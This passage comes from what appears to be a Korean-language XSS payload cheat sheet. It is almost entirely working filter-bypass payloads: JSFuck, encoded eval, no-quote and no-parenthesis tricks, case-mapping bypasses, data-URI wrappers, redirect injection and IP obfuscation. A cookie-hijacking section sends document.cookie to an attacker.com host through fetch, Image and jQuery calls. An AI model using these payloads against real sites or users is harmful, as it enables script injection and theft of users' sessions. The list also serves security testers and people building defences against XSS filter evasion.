class="string">"\\"</span>+$.__$+$.$$_+$._$_+$.__+<span class="string">"("</span>+$.___+<span class="string">")"</span>+<span class="string">"\""</span>)())();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Jsfuck (http://www.jsfuck.com/)</span></span><br><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure><h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"apple"</span>(alert(<span class="number">1</span>))</span><br><span class="line"><span class="string">"apple"</span>[alert(<span class="number">1</span>)]</span><br><span class="line"><span class="string">"apple"</span>;alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">"apple"</span>+alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">"apple"</span>-alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">"apple"</span>*alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">"apple"</span>/alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">"apple"</span>&amp;alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">"apple"</span>^alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">"apple"</span>%alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// in 연산자 ("은 사용가능하지만 연산자,개행문자 등은 불가능할 경우)</span></span><br><span class="line"><span class="string">"apple"</span>[alert(<span class="number">1</span>)]<span class="keyword">in</span><span class="string">"mango"</span></span><br><span class="line"><span class="string">"apple"</span>(alert(<span class="number">1</span>))<span class="keyword">in</span><span class="string">"mango"</span></span><br></pre></td></tr></table></figure><h2 id="Unicode-UTF-8"><a href="#Unicode-UTF-8" class="headerlink" title="Unicode / UTF-8"></a>Unicode / UTF-8</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ASCII from Unicode</span><br><span class="line">&lt; : %EF%BC%9C</span><br><span class="line">&gt; : %EF%BC%9E</span><br><span class="line">&quot; : %CA%BA</span><br><span class="line">&#39; : %CA%B9</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ASCII from UTF-8</span><br><span class="line">&lt; : %C0%BC &#x2F; %E0%80%BC &#x2F; %F0%80%80%BC</span><br><span class="line">&gt; : %C0%BE &#x2F; %E0%80%BE &#x2F; %F0%80%80%BE</span><br><span class="line">&#39; : %C0%A7 &#x2F; %E0%80%A7 &#x2F; %F0%80%80%A7</span><br><span class="line">&quot; : %C0%A2 &#x2F; %E0%80%A2 &#x2F; %F0%80%80%A2</span><br><span class="line">&quot; : %CA%BA</span><br><span class="line">&#39; : %CA%B9</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Unicode line separator (working on js)</span><br><span class="line">\u2028 : %E2%80%A8</span><br><span class="line">\u2029 : %E2%80%A9</span><br></pre></td></tr></table></figure><h2 id="No-Quote"><a href="#No-Quote" class="headerlink" title="No Quote"></a>No Quote</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// String.fromCharCode</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><br><span class="line"><span class="comment">// without ,</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">108</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">101</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// shorten with parseInt("alert",30) == 8680439</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="number">8680439.</span>.toString(<span class="number">30</span>)+<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><br><span class="line"><span class="comment">// without +</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="number">8680439.</span>.toString(<span class="number">30</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>)))</span><br><span class="line"><span class="comment">// without ,</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="number">8680439.</span>.toString(<span class="number">30</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)).concat(<span class="number">1</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unicode Encoding</span></span><br><span class="line">\u0061\u006C\u0065\u0072\u0074(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// RegExp Object</span></span><br><span class="line">alert(<span class="regexp">/1/</span>)</span><br><span class="line">alert(<span class="regexp">/1/</span>.source)</span><br><span class="line"><span class="built_in">eval</span>(atob(<span class="regexp">/YWxlcnQoMSk=/</span>.source))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attribute Referencing</span></span><br><span class="line">&lt;img src=<span class="comment">//rwx.kr%0aalert(1)// onerror=eval(decodeURI(src))&gt;</span></span><br><span class="line">&lt;img src=x:alert(<span class="number">1</span>); onerror=<span class="built_in">eval</span>(src)&gt;</span><br><span class="line">&lt;img src=http:<span class="comment">//rwx.kr onerror=eval(alt) alt=alert(1)&gt;</span></span><br><span class="line">&lt;img src alt=YWxlcnQoMSk= onerror=<span class="built_in">eval</span>(atob(alt))&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// find</span></span><br><span class="line">[<span class="number">1</span>].find(alert)</span><br></pre></td></tr></table></figure><h2 id="No-Parentheses"><a href="#No-Parentheses" class="headerlink" title="No Parentheses"></a>No Parentheses</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// constructor 이용</span></span><br><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert(1)`</span><span class="string">``</span></span><br><span class="line"><span class="comment">// hex 인코딩</span></span><br><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert\x281\x29`</span><span class="string">``</span></span><br><span class="line"><span class="comment">// backslash</span></span><br><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert\`1\``</span><span class="string">``</span></span><br><span class="line"><span class="comment">// SetTimeout</span></span><br><span class="line">setTimeout<span class="string">`alert\u00281\u0029`</span></span><br><span class="line"><span class="comment">// SetInterval</span></span><br><span class="line">setInterval<span class="string">`alert\u00281\u0029`</span></span><br><span class="line"><span class="comment">// Function</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span><span class="string">`alert(1)`</span></span><br><span class="line"><span class="built_in">Function</span><span class="string">`alert(1)`</span><span class="string">``</span></span><br><span class="line"><span class="built_in">Function</span><span class="string">`alert\x281\x29`</span><span class="string">``</span></span><br><span class="line"><span class="built_in">Function</span><span class="string">`alert\`1\``</span><span class="string">``</span></span><br><span class="line"><span class="comment">// DOM Object (top, self, window, parent, frame, globalThis)</span></span><br><span class="line">top[<span class="string">`alert`</span>]<span class="string">``</span></span><br><span class="line"><span class="built_in">window</span>[<span class="string">`alert`</span>]<span class="string">``</span></span><br><span class="line">top[<span class="string">'\141\154\145\162\164'</span>]<span class="string">``</span></span><br><span class="line"><span class="built_in">window</span>[<span class="string">'\x61\x6c\x65\x72\x74'</span>]<span class="string">``</span></span><br></pre></td></tr></table></figure><h2 id="No-Quote-and-Parentheses"><a href="#No-Quote-and-Parentheses" class="headerlink" title="No Quote and Parentheses"></a>No Quote and Parentheses</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Error Handler</span></span><br><span class="line"><span class="built_in">window</span>.onerror=alert,<span class="keyword">throw</span> <span class="number">1</span></span><br><span class="line"><span class="comment">// Attribute on HTML Tag with Entity</span></span><br><span class="line">&lt;svg onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">&lt;iframe onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line"><span class="comment">// append body</span></span><br><span class="line">_=<span class="built_in">document</span>.head.outerHTML[<span class="number">0</span>]+<span class="built_in">document</span>.head.outerHTML[<span class="number">5</span>]+URL</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML=_[<span class="number">0</span>]+<span class="regexp">/iframe onload=alert/</span>.source+_[<span class="number">14</span>]+<span class="number">1</span>+_[<span class="number">15</span>]+_[<span class="number">1</span>]</span><br><span class="line"><span class="comment">// Symbol.hasInstance</span></span><br><span class="line">_=URL+<span class="number">0</span></span><br><span class="line">/alert/.source+_[<span class="number">12</span>]+<span class="number">1</span>+_[<span class="number">13</span>]<span class="keyword">instanceof</span>&#123;[<span class="built_in">Symbol</span>.hasInstance]:<span class="built_in">eval</span>&#125;</span><br><span class="line"><span class="comment">// no curly bracket </span></span><br><span class="line">_=URL+<span class="number">0</span></span><br><span class="line"><span class="built_in">Array</span>.prototype[<span class="built_in">Symbol</span>.hasInstance]=<span class="built_in">eval</span>,/alert/.source+_[<span class="number">12</span>]+<span class="number">1</span>+_[<span class="number">13</span>]<span class="keyword">instanceof</span>[]</span><br><span class="line"><span class="comment">// no slash</span></span><br><span class="line">_=URL+!<span class="number">0</span>+!<span class="number">1</span>,<span class="built_in">Array</span>.prototype[<span class="built_in">Symbol</span>.hasInstance]=<span class="built_in">eval</span>,_[<span class="number">19</span>]+_[<span class="number">38</span>]+_[<span class="number">40</span>]+_[<span class="number">33</span>]+_[<span class="number">4</span>]+_[<span class="number">12</span>]+<span class="number">1</span>+_[<span class="number">13</span>]<span class="keyword">instanceof</span>[]</span><br><span class="line"><span class="comment">// Symbol.toPrimitive</span></span><br><span class="line">Event.prototype[<span class="built_in">Symbol</span>.toPrimitive]=<span class="function"><span class="params">x</span>=&gt;</span><span class="number">1</span>,<span class="built_in">window</span>.onload=alert</span><br><span class="line"><span class="comment">// location.search (page.php?0:alert(1)//&amp;...)</span></span><br><span class="line">Event.prototype[<span class="built_in">Symbol</span>.toPrimitive]=<span class="function"><span class="params">x</span>=&gt;</span><span class="regexp">/javascript:0/</span>.source+location.search,onload=open</span><br><span class="line"><span class="comment">// eval with jQuery</span></span><br><span class="line">Event.prototype[<span class="built_in">Symbol</span>.toPrimitive]=<span class="function"><span class="params">x</span>=&gt;</span><span class="regexp">/alert/</span>.source+[CSS+<span class="number">0</span>][<span class="number">0</span>][<span class="number">12</span>]+<span class="number">1</span>+[CSS+<span class="number">0</span>][<span class="number">0</span>][<span class="number">13</span>],<span class="built_in">window</span>.onload=$.globalEval</span><br><span class="line"><span class="comment">// function to String</span></span><br><span class="line">location=<span class="regexp">/javascript:alert/</span>.source+[CSS+<span class="number">0</span>][<span class="number">0</span>][<span class="number">12</span>]+<span class="number">1</span>+[CSS+<span class="number">0</span>][<span class="number">0</span>][<span class="number">13</span>]</span><br><span class="line"><span class="comment">// location.search (page.php?0:alert(1)//&amp;...)</span></span><br><span class="line">location=<span class="regexp">/javascript:/</span>+<span class="number">0</span>+location.search</span><br></pre></td></tr></table></figure><h2 id="Bypass-Uppercase-Lowercase"><a href="#Bypass-Uppercase-Lowercase" class="headerlink" title="Bypass Uppercase / Lowercase"></a>Bypass Uppercase / Lowercase</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CODE부분에 8진수로 인코딩</span></span><br><span class="line">[][<span class="string">"\146\151\154\164\145\162"</span>][<span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span>](<span class="string">"CODE"</span>)()</span><br><span class="line"></span><br><span class="line">ex) alert(<span class="number">1</span>) 의 경우</span><br><span class="line">[][<span class="string">"\146\151\154\164\145\162"</span>][<span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span>](<span class="string">"\141\154\145\162\164\50\61\51"</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// uppercase</span></span><br><span class="line">CSS[<span class="string">'\143\157\156\163\164\162\165\143\164\157\162'</span>](<span class="string">'\141\154\145\162\164(1)'</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// javascript::toUpperCase() / php::mb_strtoupper() 등</span></span><br><span class="line"><span class="comment">// reference : https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</span></span><br><span class="line"><span class="comment">// uppercase</span></span><br><span class="line">%c4%b1 : <span class="string">"ı"</span>.toUpperCase() == <span class="string">"I"</span></span><br><span class="line">%c5%bf : <span class="string">"ſ"</span>.toUpperCase() == <span class="string">"S"</span></span><br><span class="line"><span class="comment">// lowercase</span></span><br><span class="line">%c4%b0 : <span class="string">"İ"</span>.toLowerCase() == <span class="string">"i"</span></span><br><span class="line">%E2%<span class="number">84</span>%AA : <span class="string">"K"</span>.toLowerCase() == <span class="string">"k"</span></span><br></pre></td></tr></table></figure><h2 id="Bypass-Replace"><a href="#Bypass-Replace" class="headerlink" title="Bypass Replace"></a>Bypass Replace</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// unicode encoding</span></span><br><span class="line">ale\u0072t(<span class="number">1</span>)</span><br><span class="line">ale\u&#123;<span class="number">72</span>&#125;t(<span class="number">1</span>)</span><br><span class="line"><span class="comment">// replace 이후에 삭제되는 문자가 있다면 활용</span></span><br><span class="line">ale<span class="string">'rt(1)</span></span><br></pre></td></tr></table></figure><h2 id="Bypass-Chrome-Auditor"><a href="#Bypass-Chrome-Auditor" class="headerlink" title="Bypass Chrome Auditor"></a>Bypass Chrome Auditor</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// `로 끝나는 인자의 경우</span><br><span class="line">`&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=`$&#123;<span class="attr">alert</span>(<span class="attr">1</span>)&#125;</span></span><br><span class="line"><span class="tag">// 연속된 <span class="attr">2</span>개의 파라미터</span></span><br><span class="line">a=&lt;script&gt;"&amp;b=";alert(1)&lt;/script&gt;</span><br><span class="line">a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`&amp;b=`</span>-alert(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="string">"\&amp;b="</span>;alert(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// 같은 인자가 2번 표시될 때</span><br><span class="line">a=`;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure><h2 id="Script-in-XML"><a href="#Script-in-XML" class="headerlink" title="Script in XML"></a>Script in XML</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Whitelist-Iframe"><a href="#Whitelist-Iframe" class="headerlink" title="Whitelist Iframe"></a>Whitelist Iframe</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://youtube.com/"</span> <span class="attr">srcdoc</span>=<span class="string">"&amp;#60&amp;#105&amp;#109&amp;#103&amp;#32&amp;#115&amp;#114&amp;#99&amp;#32&amp;#111&amp;#110&amp;#101&amp;#114&amp;#114&amp;#111&amp;#114&amp;#61&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&amp;#62"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Make-Redirection"><a href="#Make-Redirection" class="headerlink" title="Make Redirection"></a>Make Redirection</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">location</span>=`//<span class="attr">www.example.com</span>`&gt;</span></span><br><span class="line">//meta tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=http://example.com/"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Cookie-Hijacking"><a href="#Cookie-Hijacking" class="headerlink" title="Cookie Hijacking"></a>Cookie Hijacking</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cookie hijacking</span></span><br><span class="line">(<span class="keyword">new</span> Image).src=<span class="string">"http://attacker.com/?q="</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line">fetch(<span class="string">'http://attacker.com/?q='</span> + <span class="built_in">document</span>.cookie)</span><br><span class="line"><span class="comment">// with jQuery</span></span><br><span class="line">$.<span class="keyword">get</span>('https://attacker.com/?q=' + document.cookie)</span><br><span class="line">$.getScript("//attacker.com/?q="+document.cookie)</span><br></pre></td></tr></table></figure><h2 id="Data-Wrapper"><a href="#Data-Wrapper" class="headerlink" title="Data Wrapper"></a>Data Wrapper</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"data:;base64,YWxlcnQoMSk="</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">'data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Variable-Make-DOM-XSS"><a href="#Variable-Make-DOM-XSS" class="headerlink" title="Variable Make DOM XSS"></a>Variable Make DOM XSS</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.URL</span><br><span class="line"><span class="built_in">document</span>.referrer</span><br><span class="line">location</span><br><span class="line">location.href</span><br><span class="line">location.search</span><br><span class="line">location.hash</span><br><span class="line">location.pathname</span><br></pre></td></tr></table></figure><h2 id="DOM-Object-Finding"><a href="#DOM-Object-Finding" class="headerlink" title="DOM Object Finding"></a>DOM Object Finding</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    A = <span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">eval</span>(name))</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; A.length; ++i) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'['</span>+name+<span class="string">'.'</span>+A[i]+<span class="string">']'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">'console.log("    "+'</span>+name+<span class="string">'.'</span>+A[i]+<span class="string">'+[])'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="string">'window'</span>)</span><br></pre></td></tr></table></figure><h2 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span class="attr">content</span>=<span class="string">"nickname=&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Obfuscate-IP-Address"><a href="#Obfuscate-IP-Address" class="headerlink" title="Obfuscate IP Address"></a>Obfuscate IP Address</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Decimal</span><br><span class="line">2130706433 (127.0.0.1)</span><br><span class="line">&#x2F;&#x2F; Omission 1</span><br><span class="line">127.1 (127.0.0.1)</span><br><span class="line">&#x2F;&#x2F; Omission 2</span><br><span class="line">192.168.1 (192.168.0.1)</span><br><span class="line">&#x2F;&#x2F; Omission &amp; Octal</span><br><span class="line">0177.1 (127.0.0.1)</span><br><span class="line">&#x2F;&#x2F; Hexademical</span><br><span class="line">0x8080808 (8.8.8.8)</span><br><span class="line">&#x2F;&#x2F; Octal &amp; Hexademical</span><br><span class="line">010.0x0000008.00000010.8 (8.8.8.8)</span><br><span class="line">&#x2F;&#x2F; Decimal &amp; Hexademical</span><br><span class="line">8.0x000000000000000080808 (8.8.8.8)</span><br></pre></td></tr></table></figure><h2 id="Escalate-XSS"><a href="#Escalate-XSS" class="headerlink" title="Escalate XSS"></a>Escalate XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Iframe src + Open Redirect + Reflected XSS &#x3D; Stored XSS</span><br><span class="line">Set-Cookie + Cookie Reflecting &#x3D; Reflected XSS</span><br></pre></td></tr></table></figure><h2 id="Bypass-History"><a href="#Bypass-History" class="headerlink" title="Bypass History"></a>Bypass History</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// require wrapper (https://hack.me/103185/link-shortening-website-xss.html)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript://example.kr/%0aalert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="A-Tag-XSS-without-interaction"><a href="#A-Tag-XSS-without-interaction" class="headerlink" title="A Tag XSS without interaction"></a>A Tag XSS without interaction</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// works on 